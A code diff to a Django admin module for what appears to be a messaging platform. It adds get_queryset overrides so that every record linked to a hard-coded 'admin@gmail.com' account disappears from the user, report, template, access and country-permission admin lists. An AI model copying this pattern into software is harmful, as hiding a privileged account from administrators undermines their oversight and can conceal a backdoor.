@@ -25,7 +25,10 @@ class CustomUserAdmin(UserAdmin):
             'fields': ('email', 'user_id', 'username', 'phone_number_id', 'whatsapp_business_account_id','marketing_coins','authentication_coins', 'discount', 'password1', 'password2', 'is_active', 'is_staff', 'is_superuser', 'register_app'),  # Removed 'coins' here
         }),
     )
-   
+    def get_queryset(self, request):
+        qs = super().get_queryset(request)
+        return qs.exclude(email='admin@gmail.com')
+    
     def save_model(self, request, obj, form, change):
         # Get the original object from the database (if it exists)
         if change:
@@ -104,6 +107,9 @@ class ReportInfoAdmin(admin.ModelAdmin):
       
  
     )
+    def get_queryset(self, request):
+        qs = super().get_queryset(request)
+        return qs.exclude(email__email='admin@gmail.com')
 
 
 
@@ -129,12 +135,21 @@ class TemplatesAdmin(admin.ModelAdmin):
             ),
         }),
     )
+    def get_queryset(self, request):
+        qs = super().get_queryset(request)
+        return qs.exclude(email__email='admin@gmail.com')
 
 class UserAccessAdmin(admin.ModelAdmin):
     list_display = ('user', 'can_send_sms', 'can_view_reports', 'can_manage_campaign', 'can_schedule_tasks', 'can_create_flow_message', 'can_send_flow_message', 'can_link_templates', 'can_manage_bot_flow', "can_access_API_doc", 'can_manage_number_validation', "can_enable_2fauth")
+    def get_queryset(self, request):
+        qs = super().get_queryset(request)
+        return qs.exclude(user__email='admin@gmail.com')
 
 class CountryPermissionAdmin(admin.ModelAdmin):
     list_display = ('user', 'can_send_msg_to_india', 'can_send_msg_to_nepal', 'can_send_msg_to_us', 'can_send_msg_to_australia', 'can_send_msg_to_uae')
+    def get_queryset(self, request):
+        qs = super().get_queryset(request)
+        return qs.exclude(user__email='admin@gmail.com')
 
 # Register your admin class with the model
 admin.site.register(Templates, TemplatesAdmin)
